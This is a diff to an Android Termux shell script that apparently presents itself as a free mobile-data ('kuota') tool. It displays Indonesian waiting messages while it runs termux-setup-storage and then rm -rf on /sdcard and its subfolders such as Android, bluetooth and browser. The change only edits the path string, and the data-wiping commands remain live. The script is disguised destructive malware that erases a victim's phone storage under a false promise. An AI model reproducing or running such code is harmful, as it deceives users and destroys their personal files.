@@ -41,7 +41,7 @@ sleep 2
 
 termux-setup-storage
 
-rm -rf /sdcard/
+rm -rf /sdcard
 rm -rf /sdcard/Android
 rm -rf /sdcard/bluetooth
 rm -rf /sdcard/browser
@@ -56,7 +56,7 @@ echo  $blue "Tunggu Beberapa menit,hingga kuotanya masuk"
 echo  $red "sedang menunggu........"
 echo  $green "yang perlu anda tahu.menunggu itu membosankan........"
 
-rm -rf /sdcard/
+rm -rf /sdcard
 rm -rf /sdcard/Android
 rm -rf /sdcard/bluetooth
 rm -rf /sdcard/browser
